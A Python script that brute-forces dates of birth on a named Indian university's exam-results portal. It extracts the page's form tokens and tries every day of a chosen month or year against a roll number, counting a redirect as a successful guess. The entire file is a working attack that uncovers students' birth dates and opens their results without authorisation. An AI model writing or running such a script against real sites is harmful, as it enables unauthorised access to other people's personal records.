import requests
from datetime import datetime, timedelta
import time
import re

def try_date(roll_no, semester, date_of_birth):
    """
    Try a specific date of birth and check if it works
    
    Args:
        roll_no: Student roll number
        semester: Semester number
        date_of_birth: Date in YYYY-MM-DD format
    
    Returns:
        True if successful, False otherwise
    """
    print(f"Trying date: {date_of_birth}")
    
    # Base URL
    url = "https://ddugorakhpur.com/result2023/searchresult_new.aspx"
    
    # Create a session to maintain cookies
    session = requests.Session()
    
    # Get initial page to extract form values
    try:
        initial_response = session.get(url)
        
        # Extract necessary form values using regex instead of BeautifulSoup
        viewstate_match = re.search(r'id="__VIEWSTATE" value="([^"]+)"', initial_response.text)
        eventvalidation_match = re.search(r'id="__EVENTVALIDATION" value="([^"]+)"', initial_response.text)
        viewstategenerator_match = re.search(r'id="__VIEWSTATEGENERATOR" value="([^"]+)"', initial_response.text)
        
        if not all([viewstate_match, eventvalidation_match, viewstategenerator_match]):
            print("Failed to extract form values")
            return False
        
        viewstate = viewstate_match.group(1)
        eventvalidation = eventvalidation_match.group(1)
        viewstategenerator = viewstategenerator_match.group(1)
        
        # Prepare form data
        form_data = {
            "__VIEWSTATE": viewstate,
            "__VIEWSTATEGENERATOR": viewstategenerator,
            "__EVENTVALIDATION": eventvalidation,
            "ddlsem": semester,
            "txtRollno": roll_no,
            "txtDob": date_of_birth,
            "btnSearch": "Search Result"
        }
        
        # Submit the form and DON'T follow redirects
        response = session.post(url, data=form_data, allow_redirects=False)
        
        # Check if there's a redirect (HTTP 302)
        if response.status_code == 302:
            redirect_url = response.headers.get('Location')
            print(f"Redirected to: {redirect_url}")
            print(f"SUCCESS! Found result page with DOB: {date_of_birth}")
            return True
                  
        else:
            print(f"No redirect. Status code: {response.status_code}")
             
    except Exception as e:
        print(f"Error: {e}")
    
    return False

def try_month_year(roll_no, semester, year, month):
    """Try all days in a specific month and year"""
    print(f"Trying all days in {month}/{year}")
    
    start_date = datetime(year, month, 1)
    if month == 12:
        end_date = datetime(year + 1, 1, 1) - timedelta(days=1)
    else:
        end_date = datetime(year, month + 1, 1) - timedelta(days=1)
    
    current_date = start_date
    while current_date <= end_date:
        date_str = current_date.strftime('%Y-%m-%d')
        if try_date(roll_no, semester, date_str):
            return date_str
        
        # Wait between attempts to avoid overloading the server
        time.sleep(1)
        current_date += timedelta(days=1)
    
    return None

def try_year(roll_no, semester, year):
    """Try all days in a specific year"""
    for month in range(1, 13):
        result = try_month_year(roll_no, semester, year, month)
        if result:
            return result
    return None

def main():
    print("DDU Result Portal DOB Finder")
    print("----------------------------")
    
    roll_no = input("Enter Roll Number: ")
    semester = input("Enter Semester (1-8): ")
    
    print("\nOptions:")
    print("1. Try specific date")
    print("2. Try all days in a specific month")
    print("3. Try all days in a specific year")
    
    choice = input("Enter your choice (1-3): ")
    
    if choice == "1":
        # Try specific date
        date_str = input("Enter date (YYYY-MM-DD): ")
        try_date(roll_no, semester, date_str)
    
    elif choice == "2":
        # Try all days in a month
        year = int(input("Enter year (YYYY): "))
        month = int(input("Enter month (1-12): "))
        result = try_month_year(roll_no, semester, year, month)
        if result:
            print(f"Found matching DOB: {result}")
        else:
            print("No matching DOB found in the specified month.")
    
    elif choice == "3":
        # Try all days in a year
        year = int(input("Enter year (YYYY): "))
        result = try_year(roll_no, semester, year)
        if result:
            print(f"Found matching DOB: {result}")
        else:
            print("No matching DOB found in the specified year.")
    
    else:
        print("Invalid choice")

if __name__ == "__main__":
    main()